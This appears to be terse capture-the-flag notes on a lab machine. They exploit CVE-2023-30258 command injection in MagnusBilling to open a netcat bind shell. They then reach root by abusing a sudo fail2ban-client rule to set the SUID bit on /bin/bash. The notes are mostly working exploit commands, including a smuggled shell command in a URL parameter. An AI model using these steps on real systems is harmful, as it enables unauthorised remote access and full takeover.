# 10.10.197.54

# exploit to get foothold:

https://github.com/MarkLee131/awesome-web-pocs/blob/main/CVE-2023-30258.md

# Command injection 

Target:

(nc -lvnp 9999 -e /bin/bash) -> http://10.10.197.54/mbilling/lib/icepay/icepay.php?democ=;nc -lvnp 9999 -e /bin/bash;


Client:
nc 10.10.197.54 9999




# prev escalation
sudo -l 

Output:
(ALL) NOPASSWD: /usr/bin/fail2ban-client


https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/


# Get jail list

sudo /usr/bin/fail2ban-client status

# Choose one of the jails from the "Jail list" in the output.

sudo /usr/bin/fail2ban-client get ip-blacklist actions

# Create a new action with arbitrary name (e.g. "evil")

sudo /usr/bin/fail2ban-client set ip-blacklist addaction evil

# Set payload to actionban

sudo /usr/bin/fail2ban-client set ip-blacklist action evil actionban "chmod +s /bin/bash"

# Trigger the action

sudo /usr/bin/fail2ban-client set ip-blacklist banip 1.2.3.5

# Now we gain a root

/bin/bash -p








